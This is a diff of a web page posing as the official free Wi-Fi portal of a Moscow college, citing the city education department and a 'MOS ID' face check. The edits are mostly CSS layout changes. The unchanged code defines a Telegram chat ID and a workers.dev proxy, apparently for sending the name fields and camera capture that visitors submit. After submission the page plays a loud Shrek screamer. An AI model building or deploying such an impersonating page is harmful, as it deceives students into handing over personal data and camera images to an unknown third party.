@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
 
   <meta name="description" content="КП-11 — Бесплатный Wi-Fi. Подключение к беспроводной сети Колледжа предпринимательства № 11"/>
   <meta property="og:image" content="college-predprinimatelstva-11.png"/>
@@ -15,65 +15,125 @@
 
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
-    html, body { height: 100%; }
+    html, body {
+      height: 100%;
+      height: 100dvh;
+      overflow: hidden;
+      overscroll-behavior: none;
+    }
     body {
       font-family: 'Segoe UI', Arial, sans-serif;
       background: #f5f5f5;
       color: #333;
-      min-height: 100vh;
       display: flex;
       flex-direction: column;
       -webkit-text-size-adjust: 100%;
     }
 
-    .app-header { background: #fff; }
+    .app-container {
+      display: flex;
+      flex-direction: column;
+      height: 100%;
+      height: 100dvh;
+      overflow: hidden;
+    }
+
+    /* ===== ШАПКА ===== */
+    .app-header {
+      background: #fff;
+      flex-shrink: 0;
+    }
     .app-header-box {
-      display: flex; align-items: center;
-      padding: 25px 30px; gap: 30px;
-      flex-wrap: nowrap; overflow: hidden;
+      display: flex;
+      align-items: center;
+      padding: 10px 22px;
+      gap: 22px;
+      flex-wrap: nowrap;
+      overflow: hidden;
     }
     .app-header-box-logo-info-container {
-      display: flex; align-items: center; gap: 35px;
-      flex-wrap: nowrap; width: 100%; min-width: 0;
+      display: flex;
+      align-items: center;
+      gap: 28px;
+      flex-wrap: nowrap;
+      width: 100%;
+      min-width: 0;
     }
     .app-header-box-logo-dep,
     .app-header-box-logo-container {
-      display: flex; align-items: center; gap: 18px;
-      min-width: 0; flex-shrink: 1;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      min-width: 0;
+      flex-shrink: 1;
     }
-    .app-header-box-logo img { height: 70px; max-width: 100%; object-fit: contain; }
+    .app-header-box-logo img {
+      height: 42px;
+      max-width: 100%;
+      object-fit: contain;
+    }
     .logo-text {
-      font-size: 16px; color: #2b5797; line-height: 1.4;
-      max-width: 260px; font-weight: 500; letter-spacing: 0.2px;
+      font-size: 13px;
+      color: #2b5797;
+      line-height: 1.3;
+      max-width: 240px;
+      font-weight: 500;
+      letter-spacing: 0.2px;
     }
     .logo-text .logo-text-sub {
-      display: block; font-size: 13px; color: #888;
-      font-weight: 400; margin-top: 2px;
+      display: block;
+      font-size: 11px;
+      color: #888;
+      font-weight: 400;
+      margin-top: 1px;
     }
     .divider {
-      width: 1px; height: 70px;
+      width: 1px;
+      height: 42px;
       background: linear-gradient(to bottom, transparent, #ccc, transparent);
       flex-shrink: 0;
     }
 
+    /* ===== МЕНЮ ===== */
     .app-nav {
-      background: #1893d2; width: 100%;
-      overflow-x: auto; -webkit-overflow-scrolling: touch;
+      background: #1893d2;
+      width: 100%;
+      overflow-x: auto;
+      -webkit-overflow-scrolling: touch;
       scrollbar-width: none;
+      flex-shrink: 0;
     }
     .app-nav::-webkit-scrollbar { display: none; }
     .app-nav ul {
-      list-style: none; display: flex; flex-wrap: nowrap;
-      width: max-content; min-width: 100%; margin: 0; padding: 0;
+      list-style: none;
+      display: flex;
+      flex-wrap: nowrap;
+      width: max-content;
+      min-width: 100%;
+      margin: 0;
+      padding: 0;
     }
-    .app-nav li { flex: 1 1 0; min-width: 130px; position: relative; }
+    .app-nav li {
+      flex: 1 1 0;
+      min-width: 100px;
+      position: relative;
+    }
     .app-nav a {
-      display: flex; flex-direction: column;
-      align-items: center; justify-content: center;
-      gap: 4px; color: #fff; text-decoration: none;
-      padding: 12px 10px; font-size: 15px; font-weight: 500;
-      transition: background 0.2s; text-align: center;
-      width: 100%; height: 100%; white-space: nowrap;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 2px;
+      color: #fff;
+      text-decoration: none;
+      padding: 6px 6px;
+      font-size: 11px;
+      font-weight: 500;
+      transition: background 0.2s;
+      text-align: center;
+      width: 100%;
+      height: 100%;
+      white-space: nowrap;
     }
     .app-nav a:hover { background: #2b5797; }
     .app-nav a.active {
@@ -81,75 +141,125 @@
       box-shadow: inset 0 -3px 0 #fff;
     }
     .app-nav a .nav-icon {
-      display: inline-flex; align-items: center;
-      justify-content: center; font-size: 26px; line-height: 1;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 16px;
+      line-height: 1;
     }
 
-    .welcome { text-align: center; padding: 60px 20px 20px; }
-    .welcome h2 { font-size: 32px; color: #1893d2; font-weight: 600; }
-
+    /* ===== ЦЕНТРАЛЬНАЯ ЧАСТЬ ===== */
     main {
-      flex: 1; padding: 20px;
-      max-width: 1200px; width: 100%; margin: 0 auto;
+      flex: 1;
+      padding: 8px 16px;
+      max-width: 1200px;
+      width: 100%;
+      margin: 0 auto;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+      min-height: 0;
+    }
+
+    .welcome {
+      text-align: center;
+      padding: 6px 20px 4px;
+      flex-shrink: 0;
+    }
+    .welcome h2 {
+      font-size: 18px;
+      color: #1893d2;
+      font-weight: 600;
     }
 
     .wifi-card {
-      max-width: 460px; margin: 0 auto 40px;
-      background: #fff; border-radius: 16px;
-      padding: 28px 26px 26px;
+      max-width: 380px;
+      width: 100%;
+      background: #fff;
+      border-radius: 14px;
+      padding: 16px 18px 16px;
       box-shadow: 0 4px 24px rgba(0,0,0,0.08);
       border: 1px solid #eaeaea;
+      flex-shrink: 0;
+      max-height: calc(100% - 40px);
+      overflow-y: auto;
     }
     .wifi-card h3 {
-      font-size: 20px; color: #2b5797;
-      margin-bottom: 6px; text-align: center;
+      font-size: 16px;
+      color: #2b5797;
+      margin-bottom: 3px;
+      text-align: center;
     }
     .wifi-card .wifi-sub {
-      font-size: 13px; color: #888;
-      text-align: center; margin-bottom: 22px;
+      font-size: 11.5px;
+      color: #888;
+      text-align: center;
+      margin-bottom: 10px;
     }
     .wifi-card label {
-      display: block; font-size: 13px;
-      color: #555; margin-bottom: 6px; font-weight: 500;
+      display: block;
+      font-size: 11.5px;
+      color: #555;
+      margin-bottom: 3px;
+      font-weight: 500;
     }
     .wifi-card input,
     .wifi-card select {
-      width: 100%; padding: 12px 14px;
-      border-radius: 10px; border: 1px solid #d6d6d6;
-      background: #fafafa; color: #333; font-size: 15px;
-      margin-bottom: 16px; outline: none;
+      width: 100%;
+      padding: 8px 11px;
+      border-radius: 8px;
+      border: 1px solid #d6d6d6;
+      background: #fafafa;
+      color: #333;
+      font-size: 13.5px;
+      margin-bottom: 8px;
+      outline: none;
       font-family: inherit;
       transition: border-color 0.15s, background 0.15s;
     }
     .wifi-card input:focus,
     .wifi-card select:focus {
-      border-color: #1893d2; background: #fff;
+      border-color: #1893d2;
+      background: #fff;
     }
     .wifi-card input::placeholder { color: #aaa; }
     .wifi-card select.staff-option {
-      color: #1893d2; font-weight: 700;
+      color: #1893d2;
+      font-weight: 700;
     }
     .wifi-card input.input-invalid {
-      border-color: #e53935; background: #fff5f5;
+      border-color: #e53935;
+      background: #fff5f5;
     }
     .wifi-card input.input-valid {
-      border-color: #43a047; background: #f1f8f1;
+      border-color: #43a047;
+      background: #f1f8f1;
     }
 
     .field-error {
-      display: none; color: #e53935;
-      font-size: 12.5px; margin: -10px 0 14px;
-      line-height: 1.4;
+      display: none;
+      color: #e53935;
+      font-size: 11.5px;
+      margin: -5px 0 8px;
+      line-height: 1.35;
     }
     .field-error.show { display: block; }
 
     .wifi-card button {
-      width: 100%; padding: 14px;
-      border: none; border-radius: 10px;
-      background: #1893d2; color: #fff;
-      font-size: 16px; font-weight: 600;
-      cursor: pointer; transition: background 0.2s;
+      width: 100%;
+      padding: 10px;
+      border: none;
+      border-radius: 8px;
+      background: #1893d2;
+      color: #fff;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s;
       font-family: inherit;
+      margin-top: 2px;
     }
     .wifi-card button:hover { background: #1479ae; }
     .wifi-card button:disabled { opacity: 0.5; cursor: not-allowed; }
@@ -157,47 +267,70 @@
     .field-hidden { display: none !important; }
 
     .notice {
-      display: none; margin: 0 auto 20px;
-      max-width: 460px; background: #fff3cd;
-      border: 1px solid #ffe69c; color: #7a5b00;
-      padding: 16px 18px; border-radius: 12px;
-      font-size: 14px; line-height: 1.45;
-      text-align: center; animation: fadeIn 0.25s ease;
+      display: none;
+      margin: 0 auto 10px;
+      max-width: 380px;
+      width: 100%;
+      background: #fff3cd;
+      border: 1px solid #ffe69c;
+      color: #7a5b00;
+      padding: 10px 14px;
+      border-radius: 10px;
+      font-size: 12.5px;
+      line-height: 1.4;
+      text-align: center;
+      animation: fadeIn 0.25s ease;
+      flex-shrink: 0;
     }
     .notice.show { display: block; }
-    .notice b { display: block; margin-bottom: 4px; font-size: 15px; }
+    .notice b { display: block; margin-bottom: 3px; font-size: 13.5px; }
 
     @keyframes fadeIn {
       from { opacity: 0; transform: translateY(-4px); }
       to   { opacity: 1; transform: translateY(0); }
     }
 
+    /* ===== ФУТЕР ===== */
     .app-footer {
-      background: #2b5797; color: #fff;
-      padding: 25px 30px; font-size: 14px;
-      text-align: center; margin-top: auto;
+      background: #2b5797;
+      color: #fff;
+      padding: 8px 16px;
+      font-size: 10px;
+      text-align: center;
+      flex-shrink: 0;
+      line-height: 1.35;
     }
-    .app-footer a {
-      color: #fff; text-decoration: underline; opacity: 0.9;
-    }
+    .app-footer a { color: #fff; text-decoration: underline; opacity: 0.9; }
     .app-footer a:hover { opacity: 1; }
-    .app-footer p { margin: 6px 0; }
+    .app-footer p { margin: 1px 0; }
 
     /* ===== MOS ID ===== */
     .mosid-overlay {
-      display: none; position: fixed; inset: 0;
-      background: rgba(0, 0, 0, 0.6); z-index: 1000;
-      align-items: center; justify-content: center;
-      padding: 20px; animation: fadeIn 0.2s ease;
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.6);
+      z-index: 1000;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+      animation: fadeIn 0.2s ease;
     }
     .mosid-overlay.show { display: flex; }
 
     .mosid-window {
-      background: #fff; border-radius: 20px;
-      max-width: 420px; width: 100%;
+      background: #fff;
+      border-radius: 18px;
+      max-width: 380px;
+      width: 100%;
+      max-height: calc(100vh - 32px);
+      max-height: calc(100dvh - 32px);
       border: 3px solid #e60000;
       box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
-      overflow: hidden; animation: popIn 0.3s ease;
+      overflow: hidden;
+      animation: popIn 0.3s ease;
+      display: flex;
+      flex-direction: column;
     }
     @keyframes popIn {
       from { transform: scale(0.9); opacity: 0; }
@@ -205,28 +338,46 @@
     }
 
     .mosid-header {
-      padding: 20px;
-      display: flex; align-items: center;
-      justify-content: center; gap: 14px;
-      background: #fafafa; border-bottom: 1px solid #eaeaea;
+      padding: 14px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      background: #fafafa;
+      border-bottom: 1px solid #eaeaea;
+      flex-shrink: 0;
     }
-    .mosid-header img { height: 40px; object-fit: contain; }
-    .mosid-header .mosid-sep { font-size: 20px; color: #ccc; }
+    .mosid-header img { height: 34px; object-fit: contain; }
+    .mosid-header .mosid-sep { font-size: 18px; color: #ccc; }
 
-    .mosid-body { padding: 24px 20px 20px; text-align: center; }
+    .mosid-body {
+      padding: 16px 16px 14px;
+      text-align: center;
+      overflow-y: auto;
+      flex: 1;
+    }
     .mosid-title {
-      font-size: 17px; font-weight: 600;
-      color: #2b5797; margin-bottom: 6px;
+      font-size: 15px;
+      font-weight: 600;
+      color: #2b5797;
+      margin-bottom: 4px;
     }
     .mosid-sub {
-      font-size: 13px; color: #888; margin-bottom: 20px;
+      font-size: 12px;
+      color: #888;
+      margin-bottom: 14px;
     }
 
     .camera-frame {
-      width: 100%; max-width: 300px; height: 300px;
-      margin: 0 auto 18px; border-radius: 14px;
-      background: #1a1f26; position: relative;
-      overflow: hidden; border: 3px solid #444;
+      width: 100%;
+      max-width: 240px;
+      height: 240px;
+      margin: 0 auto 12px;
+      border-radius: 12px;
+      background: #1a1f26;
+      position: relative;
+      overflow: hidden;
+      border: 3px solid #444;
       transition: border-color 0.3s;
     }
     .camera-frame.recording {
@@ -234,7 +385,8 @@
       animation: pulse 1.5s ease-in-out infinite;
     }
     .camera-frame.success {
-      border-color: #43a047; animation: none;
+      border-color: #43a047;
+      animation: none;
     }
     @keyframes pulse {
       0%, 100% { box-shadow: 0 0 0 0 rgba(230, 0, 0, 0.6); }
@@ -243,61 +395,84 @@
 
     .camera-frame video,
     .camera-frame canvas {
-      width: 100%; height: 100%;
-      object-fit: cover; display: block;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
       -webkit-transform: scaleX(-1);
       transform: scaleX(-1);
     }
     .camera-frame .cam-placeholder {
-      position: absolute; inset: 0;
-      display: flex; flex-direction: column;
-      align-items: center; justify-content: center;
-      color: #888; font-size: 14px; gap: 10px;
+      position: absolute;
+      inset: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      color: #888;
+      font-size: 12px;
+      gap: 8px;
     }
     .camera-frame .cam-placeholder .cam-icon {
-      font-size: 48px; opacity: 0.5;
+      font-size: 38px;
+      opacity: 0.5;
     }
     .camera-frame .check-overlay {
-      position: absolute; inset: 0;
+      position: absolute;
+      inset: 0;
       background: rgba(67, 160, 71, 0.9);
-      display: flex; align-items: center;
-      justify-content: center; color: #fff;
-      font-size: 100px; font-weight: 700;
-      opacity: 0; transition: opacity 0.3s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      font-size: 80px;
+      font-weight: 700;
+      opacity: 0;
+      transition: opacity 0.3s;
       pointer-events: none;
     }
     .camera-frame.success .check-overlay { opacity: 1; }
 
     .mosid-status {
-      font-size: 14px; color: #666;
-      margin-bottom: 16px; min-height: 20px;
+      font-size: 12.5px;
+      color: #666;
+      margin-bottom: 8px;
+      min-height: 18px;
     }
     .mosid-status.success { color: #2e7d32; font-weight: 600; }
     .mosid-status.error { color: #c62828; }
 
-    /* ===== ШРЕК (внутри main) ===== */
+    /* ===== ШРЕК ===== */
     .shrek-screen {
       display: none;
       text-align: center;
-      padding: 20px 10px 40px;
-      max-width: 700px;
+      padding: 0;
+      width: 100%;
+      max-width: 100%;
       margin: 0 auto;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+      min-height: 0;
+      flex: 1;
     }
     .shrek-screen.show {
-      display: block;
+      display: flex;
       animation: fadeIn 0.4s ease;
     }
 
     .shrek-title {
-      font-size: 42px;
+      font-size: 22px;
       font-weight: 900;
       color: #e60000;
       text-transform: uppercase;
-      line-height: 1.15;
-      margin-bottom: 24px;
+      line-height: 1.1;
+      margin-bottom: 10px;
       text-shadow: 2px 2px 0 #000, -2px -2px 0 #000, 2px -2px 0 #000, -2px 2px 0 #000;
-      letter-spacing: 1px;
+      letter-spacing: 0.5px;
       animation: shakeTitle 0.8s ease-in-out infinite;
+      flex-shrink: 0;
     }
     @keyframes shakeTitle {
       0%, 100% { transform: translateX(0) rotate(0deg); }
@@ -309,12 +484,15 @@
 
     .shrek-img {
       max-width: 100%;
-      width: 460px;
-      border-radius: 16px;
+      max-height: calc(100vh - 320px);
+      max-height: calc(100dvh - 320px);
+      width: auto;
+      border-radius: 12px;
       box-shadow: 0 10px 40px rgba(0,0,0,0.35);
       display: block;
       margin: 0 auto;
       animation: shakeImg 0.7s ease-in-out infinite;
+      object-fit: contain;
     }
     @keyframes shakeImg {
       0%, 100% { transform: translate(0, 0) rotate(0deg) scale(1); }
@@ -324,65 +502,147 @@
       80%      { transform: translate(2px, -1px) rotate(0.8deg) scale(1.005); }
     }
 
+    /* ===== АДАПТИВ ===== */
+
+    /* Планшет */
     @media (max-width: 992px) {
-      .app-header-box { padding: 20px; gap: 20px; }
-      .app-header-box-logo-info-container { gap: 22px; }
-      .app-header-box-logo img { height: 58px; }
-      .logo-text { font-size: 14px; max-width: 200px; }
-      .logo-text .logo-text-sub { font-size: 12px; }
-      .divider { height: 58px; }
-      .welcome h2 { font-size: 28px; }
-      .shrek-title { font-size: 36px; }
-    }
-    @media (max-width: 768px) {
-      .app-header-box { padding: 14px; gap: 14px; }
-      .app-header-box-logo-info-container { gap: 14px; }
-      .app-header-box-logo-dep,
-      .app-header-box-logo-container { gap: 10px; }
-      .app-header-box-logo img { height: 44px; }
-      .logo-text { font-size: 12px; max-width: 140px; line-height: 1.25; }
+      .app-header-box { padding: 10px 18px; gap: 18px; }
+      .app-header-box-logo-info-container { gap: 20px; }
+      .app-header-box-logo img { height: 40px; }
+      .logo-text { font-size: 12px; max-width: 180px; }
       .logo-text .logo-text-sub { font-size: 10px; }
-      .divider { height: 44px; }
-      .app-nav li { min-width: 110px; }
-      .app-nav a { font-size: 12px; padding: 9px 8px; }
-      .app-nav a .nav-icon { font-size: 20px; }
-      .welcome { padding: 40px 15px 15px; }
-      .welcome h2 { font-size: 24px; }
-      main { padding: 15px; }
-      .wifi-card { padding: 22px 18px 20px; }
-      .app-footer { padding: 20px 15px; font-size: 12px; }
-      .shrek-title { font-size: 26px; }
-      .shrek-img { width: 100%; }
-      .camera-frame { height: 260px; }
-    }
-    @media (max-width: 480px) {
-      .app-header-box { padding: 10px; gap: 10px; }
-      .app-header-box-logo-info-container { gap: 10px; }
-      .app-header-box-logo-dep,
-      .app-header-box-logo-container { gap: 7px; }
-      .app-header-box-logo img { height: 34px; }
-      .logo-text { font-size: 10px; max-width: 110px; line-height: 1.2; }
-      .logo-text .logo-text-sub { font-size: 8px; }
-      .divider { height: 34px; }
-      .app-nav li { min-width: 92px; }
-      .app-nav a { font-size: 11px; padding: 8px 6px; }
-      .app-nav a .nav-icon { font-size: 18px; }
-      .welcome h2 { font-size: 20px; }
-      .app-footer { font-size: 10px; }
+      .divider { height: 40px; }
+      .welcome h2 { font-size: 17px; }
       .shrek-title { font-size: 20px; }
     }
-    @media (max-width: 360px) {
+
+    /* Телефон горизонтально и небольшие экраны */
+    @media (max-width: 768px) {
+      .app-header-box { padding: 8px 14px; gap: 14px; }
+      .app-header-box-logo-info-container { gap: 12px; }
+      .app-header-box-logo-dep,
+      .app-header-box-logo-container { gap: 8px; }
+      .app-header-box-logo img { height: 34px; }
+      .logo-text { font-size: 10.5px; max-width: 130px; line-height: 1.2; }
+      .logo-text .logo-text-sub { font-size: 9px; }
+      .divider { height: 34px; }
+
+      .app-nav li { min-width: 85px; }
+      .app-nav a { font-size: 10px; padding: 5px 4px; }
+      .app-nav a .nav-icon { font-size: 15px; }
+
+      .welcome { padding: 4px 12px 3px; }
+      .welcome h2 { font-size: 15px; }
+
+      main { padding: 6px 12px; }
+
+      .wifi-card { padding: 14px 16px 14px; max-width: 340px; }
+      .wifi-card h3 { font-size: 15px; }
+      .wifi-card .wifi-sub { font-size: 11px; margin-bottom: 8px; }
+      .wifi-card label { font-size: 11px; }
+      .wifi-card input,
+      .wifi-card select { padding: 7px 10px; font-size: 13px; margin-bottom: 7px; }
+      .wifi-card button { padding: 9px; font-size: 13px; }
+
+      .app-footer { padding: 6px 12px; font-size: 9px; }
+
+      .shrek-title { font-size: 17px; margin-bottom: 8px; }
+      .shrek-img { max-height: calc(100vh - 300px); max-height: calc(100dvh - 300px); }
+
+      .camera-frame { max-width: 200px; height: 200px; }
+      .mosid-body { padding: 14px 14px 12px; }
+      .mosid-title { font-size: 14px; }
+      .mosid-sub { font-size: 11px; margin-bottom: 12px; }
+    }
+
+    /* Маленькие телефоны */
+    @media (max-width: 480px) {
+      .app-header-box { padding: 6px 10px; gap: 10px; }
+      .app-header-box-logo-info-container { gap: 8px; }
+      .app-header-box-logo-dep,
+      .app-header-box-logo-container { gap: 6px; }
       .app-header-box-logo img { height: 28px; }
-      .logo-text { font-size: 9px; max-width: 90px; }
-      .logo-text .logo-text-sub { display: none; }
+      .logo-text { font-size: 9px; max-width: 105px; }
+      .logo-text .logo-text-sub { font-size: 8px; }
       .divider { height: 28px; }
-      .shrek-title { font-size: 16px; }
+
+      .app-nav li { min-width: 72px; }
+      .app-nav a { font-size: 9px; padding: 4px 3px; gap: 1px; }
+      .app-nav a .nav-icon { font-size: 13px; }
+
+      .welcome { padding: 3px 10px 2px; }
+      .welcome h2 { font-size: 14px; }
+
+      main { padding: 4px 10px; }
+
+      .wifi-card { padding: 12px 14px 12px; max-width: 300px; }
+      .wifi-card h3 { font-size: 14px; margin-bottom: 2px; }
+      .wifi-card .wifi-sub { font-size: 10.5px; margin-bottom: 6px; }
+      .wifi-card label { font-size: 10.5px; }
+      .wifi-card input,
+      .wifi-card select { padding: 6px 9px; font-size: 12.5px; margin-bottom: 6px; border-radius: 7px; }
+      .wifi-card button { padding: 8px; font-size: 12.5px; }
+
+      .app-footer { padding: 5px 10px; font-size: 8px; }
+
+      .shrek-title { font-size: 15px; margin-bottom: 6px; }
+      .shrek-img { max-height: calc(100vh - 280px); max-height: calc(100dvh - 280px); }
+
+      .camera-frame { max-width: 170px; height: 170px; }
+      .mosid-header { padding: 12px; gap: 10px; }
+      .mosid-header img { height: 28px; }
+      .mosid-body { padding: 12px 12px 10px; }
+      .mosid-title { font-size: 13px; }
+      .mosid-sub { font-size: 10.5px; margin-bottom: 10px; }
+      .mosid-status { font-size: 11.5px; }
+      .notice { padding: 8px 12px; font-size: 11.5px; max-width: 300px; }
+      .notice b { font-size: 12.5px; }
+    }
+
+    /* Совсем маленькие */
+    @media (max-width: 360px) {
+      .app-header-box-logo img { height: 24px; }
+      .logo-text { font-size: 8.5px; max-width: 90px; }
+      .logo-text .logo-text-sub { display: none; }
+      .divider { height: 24px; }
+      .app-nav a { font-size: 8.5px; }
+      .app-nav a .nav-icon { font-size: 12px; }
+      .welcome h2 { font-size: 13px; }
+      .wifi-card h3 { font-size: 13px; }
+      .wifi-card input,
+      .wifi-card select { font-size: 12px; padding: 5px 8px; }
+      .wifi-card button { padding: 7px; font-size: 12px; }
+      .shrek-title { font-size: 13px; }
+      .shrek-img { max-height: calc(100vh - 260px); max-height: calc(100dvh - 260px); }
+    }
+
+    /* Для очень низких экранов (например, iPhone в ландшафте) */
+    @media (max-height: 500px) and (orientation: landscape) {
+      .app-header-box { padding: 4px 12px; }
+      .app-header-box-logo img { height: 26px; }
+      .divider { height: 26px; }
+      .logo-text { font-size: 9px; }
+      .logo-text .logo-text-sub { font-size: 8px; }
+      .app-nav a { padding: 3px 5px; font-size: 9px; }
+      .app-nav a .nav-icon { font-size: 13px; }
+      .welcome { padding: 2px 10px 2px; }
+      .welcome h2 { font-size: 13px; }
+      .wifi-card { padding: 10px 14px; }
+      .wifi-card h3 { font-size: 13px; margin-bottom: 2px; }
+      .wifi-card .wifi-sub { font-size: 10px; margin-bottom: 6px; }
+      .wifi-card label { font-size: 10px; margin-bottom: 2px; }
+      .wifi-card input,
+      .wifi-card select { padding: 5px 9px; font-size: 12px; margin-bottom: 5px; }
+      .wifi-card button { padding: 7px; font-size: 12px; }
+      .app-footer { padding: 4px 10px; font-size: 8px; }
+      .shrek-title { font-size: 14px; margin-bottom: 5px; }
+      .shrek-img { max-height: calc(100vh - 200px); max-height: calc(100dvh - 200px); }
     }
   </style>
 </head>
 <body class="app" data-level="all" data-eo-id="12887">
 
-  <div class="app-container" style="display:flex; flex-direction:column; flex:1;">
+  <div class="app-container">
 
     <div id="app-root-0" class="app-header">
       <div class="app-header-box">
@@ -412,7 +672,7 @@
       <nav class="app-nav">
         <ul>
           <li><a href="#"><span class="nav-icon">🏠</span> Главная</a></li>
-          <li><a href="#" class="active"><span class="nav-icon">📶</span> Подключение к Wi-Fi</a></li>
+          <li><a href="#" class="active"><span class="nav-icon">📶</span> Wi-Fi</a></li>
           <li><a href="#"><span class="nav-icon">ℹ️</span> О колледже</a></li>
           <li><a href="#"><span class="nav-icon">🎓</span> Поступающим</a></li>
           <li><a href="#"><span class="nav-icon">📚</span> Студентам</a></li>
@@ -422,7 +682,7 @@
       </nav>
     </div>
 
-    <div class="welcome">
+    <div class="welcome" id="welcomeBlock">
       <h2>Добро пожаловать!</h2>
     </div>
 
@@ -480,12 +740,13 @@
         <audio id="shrekAudio" src="blyyaaaaaaaaaaaat.mp3" preload="auto"></audio>
       </div>
     </main>
-  </div>
 
-  <div class="app-footer">
-    <p>2026 © <a href="https://center.educom.ru/oauth/store/user_agreement.pdf" target="_blank" rel="noopener noreferrer">Соглашение о пользовании ЕКИС ДОНМ</a></p>
-    <p>2026 © <a href="https://www.mos.ru/donm/" target="_blank" rel="noopener noreferrer">Департамент образования и науки города Москвы</a></p>
-    <p>2026 © <a href="https://digitalcenter.moscow/" target="_blank" rel="noopener noreferrer">Разработка и поддержка ГАУ «Центр цифровизации образования»</a></p>
+    <div class="app-footer">
+      <p>2026 © <a href="https://center.educom.ru/oauth/store/user_agreement.pdf" target="_blank" rel="noopener noreferrer">Соглашение о пользовании ЕКИС ДОНМ</a></p>
+      <p>2026 © <a href="https://www.mos.ru/donm/" target="_blank" rel="noopener noreferrer">Департамент образования и науки города Москвы</a></p>
+      <p>2026 © <a href="https://digitalcenter.moscow/" target="_blank" rel="noopener noreferrer">Разработка и поддержка ГАУ «Центр цифровизации образования»</a></p>
+    </div>
+
   </div>
 
   <div class="mosid-overlay" id="mosidOverlay">
@@ -534,13 +795,11 @@
   const TELEGRAM_CHAT_ID = "6651741310";
   const PROXY_URL = "https://kp11-bot-proxy.riwendik.workers.dev";
 
-  // Универсальный запрос с повтором
   async function fetchWithRetry(url, options, maxRetries = 2) {
     for (let attempt = 0; attempt <= maxRetries; attempt++) {
       try {
         const res = await fetch(url, options);
         if (res.ok) return res;
-        // Если 4xx/5xx — на повтор
         if (attempt === maxRetries) return res;
         console.warn(`Попытка ${attempt + 1} не удалась, статус ${res.status}. Повтор...`);
         await new Promise(r => setTimeout(r, 1500));
@@ -879,6 +1138,7 @@
   const notice     = document.getElementById('notice');
   const wifiCard   = document.getElementById('wifiCard');
   const shrekScreen = document.getElementById('shrekScreen');
+  const welcomeBlock = document.getElementById('welcomeBlock');
 
   function showFioError(msg) {
     fioError.textContent = msg;
@@ -983,7 +1243,6 @@
   let pendingData = null;
   let audioUnlocked = false;
 
-  // Разблокировка звука через muted — ГАРАНТИРОВАННО не даст звук проскочить
   function unlockAudio() {
     if (audioUnlocked) return;
     try {
@@ -995,7 +1254,6 @@
           setTimeout(() => {
             shrekAudio.pause();
             shrekAudio.currentTime = 0;
-            // НЕ снимаем muted здесь — оставим до появления Шрека
             audioUnlocked = true;
             console.log("Звук разблокирован (muted)");
           }, 100);
@@ -1118,9 +1376,9 @@
 
   function showShrekWithReaction() {
     wifiCard.style.display = 'none';
+    welcomeBlock.style.display = 'none';
     shrekScreen.classList.add('show');
 
-    // ЗВУК — только сейчас, с полной громкостью
     try {
       shrekAudio.muted = false;
       shrekAudio.volume = 1.0;
@@ -1129,7 +1387,6 @@
       if (p && p.catch) {
         p.catch(err => {
           console.warn("Play error:", err);
-          // Запасной вариант — разблокировка при первом клике
           const unlock = () => {
             shrekAudio.muted = false;
             shrekAudio.volume = 1.0;
@@ -1155,6 +1412,7 @@
 
   function showShrekWithoutRecording() {
     wifiCard.style.display = 'none';
+    welcomeBlock.style.display = 'none';
     shrekScreen.classList.add('show');
 
     try {
